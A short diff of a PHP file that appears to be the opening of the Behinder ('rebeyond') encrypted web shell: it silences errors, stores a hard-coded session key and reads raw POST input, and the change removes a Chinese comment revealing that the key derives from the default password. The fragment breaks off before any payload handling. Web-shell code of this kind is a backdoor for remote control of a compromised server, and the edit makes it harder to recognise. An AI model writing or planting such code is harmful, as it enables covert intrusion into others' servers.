@@ -1,7 +1,7 @@
 <?php
 @error_reporting(0);
 session_start();
-    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
+    $key="e45e329feb5d925b";
 	$_SESSION['k']=$key;
 	session_write_close();
 	$post=file_get_contents("php://input");
